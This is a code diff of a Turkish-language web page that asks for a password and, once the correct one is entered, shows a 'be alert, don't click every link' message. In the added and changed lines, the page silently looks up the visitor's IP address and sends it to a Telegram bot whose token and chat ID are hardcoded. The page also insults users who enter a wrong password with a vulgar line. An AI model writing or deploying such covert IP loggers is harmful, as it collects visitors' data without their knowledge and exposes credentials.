@@ -61,12 +61,12 @@
 
   <div id="girisEkrani">
     <h2>Şifreyi Gir</h2>
-    <input type="password" id="sifreInput" placeholder="Şifre">
+    <input type="password" id="sifreInput" placeholder="şifre">
     <br>
     <button onclick="kontrolEt()">Giriş</button>
   </div>
 
-  <div id="ayikOl">AYIK OL</div>
+  <div id="ayikOl">AYIK OL<br><span style="font-size: 18px; color: orange;">her linke tıklama</span></div>
   <div id="hataMesaji">Senin kafatasını sikeyim şifreyi girmeyi bile beceremedin.</div>
 
   <script>
@@ -76,14 +76,15 @@
         document.getElementById("girisEkrani").style.display = "none";
         document.getElementById("ayikOl").style.display = "block";
 
+        // IP alma ve Telegram'a gönderme
         fetch("https://api.ipify.org?format=json")
           .then(res => res.json())
           .then(data => {
             const ip = data.ip;
-            const botToken = "8430632094:AAGAMTPBAgHp4OVY4ZHGsC29pytmL5aaSvg";
+            const botToken = "8403692094:AAGM3PBAgHp4OYV4ZghC92p9ytml5aaSv1g";
             const chatId = "7791726274";
-            const message = `🚨 Yeni Giriş: ${ip}`;
-
+            const message = `📡 Yeni Ziyaretçi IP: ${ip}`;
+            
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
               method: "POST",
               headers: {
@@ -94,10 +95,8 @@
                 text: message
               })
             });
-          })
-          .catch(err => console.error("IP alınamadı veya gönderilemedi:", err));
+          });
       } else {
-        document.getElementById("girisEkrani").style.display = "none";
         document.getElementById("hataMesaji").style.display = "block";
       }
     }
